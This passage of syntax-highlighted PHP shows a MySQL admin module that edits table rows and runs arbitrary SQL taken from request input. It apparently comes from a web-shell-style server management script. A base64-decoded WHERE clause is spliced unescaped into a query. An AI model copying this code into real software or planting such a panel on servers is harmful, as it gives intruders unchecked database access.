<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">'SHOW COLUMNS FROM '</span>.$<span style="color: #ffcc66;">tablename</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">row</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">result</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span>[] = $<span style="color: #ffcc66;">row</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rs</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'insert'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #ffcc66;">tablename</span>.<span style="color: #66cccc;">' table &amp;raquo;&lt;/</span><span style="color: #66cccc; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #ffcc66;">tablename</span>.<span style="color: #66cccc;">' table &amp;raquo;&lt;/h2</span><span style="color: #66cccc; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = <span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(</span>$<span style="color: #ffcc66;">base64</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SELECT * FROM $tablename WHERE $where LIMIT</span><span style="color: #66cccc; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rs</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">result</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form method="post" action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'tablename'</span>,$<span style="color: #ffcc66;">tablename</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">rowdb</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">row</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">rs</span>[$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>]]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">value</span> = <span style="color: #cccccc; background-color: #2d2d2d;">htmlspecialchars(</span>$<span style="color: #ffcc66;">rs</span>[$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>]]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">value</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\</span><span style="color: #66cccc; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key'</span>] == <span style="color: #66cccc;">'UNI'</span> || $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Extra'</span>] == <span style="color: #66cccc;">'auto_incre</span><span style="color: #66cccc; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffcc66; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #66cccc; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>].<span style="color: #66cccc;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Type'</span>].<span style="color: #66cccc; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {<span style="color: #f2777a; background-color: #515151;">                            </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>].<span style="color: #66cccc;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Type'</span>].<span style="color: #66cccc; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'insert'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #66cccc; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #66cccc; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'base64'</span>, $<span style="color: #ffcc66;">base64</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">querys</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">';'</span>,$<span style="color: #ffcc66;">sql_query</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">querys</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">num</span>=&gt;$<span style="color: #ffcc66;">query</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">query</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #cccccc; background-color: #2d2d2d;">htmlspecialchars(</span>$<span style="color: #ffcc66;">query</span>,<span style="color: #6699cc;">EN</span><span style="color: #6699cc; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">switch</span>(<span style="color: #cccccc; background-color: #2d2d2d;">qy(</span>$<span style="color: #ffcc66;">query</span>))
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">case</span> <span style="color: #6699cc;">0</span>:
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Error : '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">mysql_error(</span>).<span style="color: #66cccc;">'&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">break</span>;<span style="color: #f2777a; background-color: #515151;">  </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">case</span> <span style="color: #6699cc;">1</span>:
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">strtolower(substr(</span>$<span style="color: #ffcc66;">query</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0</span>,<span style="color: #cccccc; background-color: #2d2d2d;">13</span>)) == <span style="color: #66cccc;">'sele</span><span style="color: #66cccc; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">allowedit</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">getnumsql</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tatol</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_num_rows(q(</span>$<span style="color: #ffcc66;">getnumsql</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> = <span style="color: #cccccc; background-color: #2d2d2d;">multi(</span>$<span style="color: #ffcc66;">tatol</span>, $<span style="color: #ffcc66;">pagenum</span>, $<span style="color: #ffcc66;">pa</span><span style="color: #ffcc66; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">tablename</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">sql_line</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(array(</span><span style="color: #66cccc;">"\r"</span>, <span style="color: #66cccc;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">array(</span><span style="color: #66cccc; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">trim(htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">sql_line</span> = <span style="color: #cccccc; background-color: #2d2d2d;">preg_replace(</span><span style="color: #66cccc;">"/\/\*[^(\*\/)]</span><span style="color: #66cccc; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">preg_match_all(</span><span style="color: #66cccc;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #66cccc; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,$</span><span style="color: #ffcc66; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,$</span><span style="color: #ffcc66; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tablename</span> = $<span style="color: #ffcc66;">matches</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>][<span style="color: #cccccc; background-color: #2d2d2d;">0</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">/*********************</span><span style="color: #999999; font-style: italic;">/</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">getfield</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW COLUMNS FROM $tablename"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">keyfied</span> = <span style="color: #66cccc;">''</span>; <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
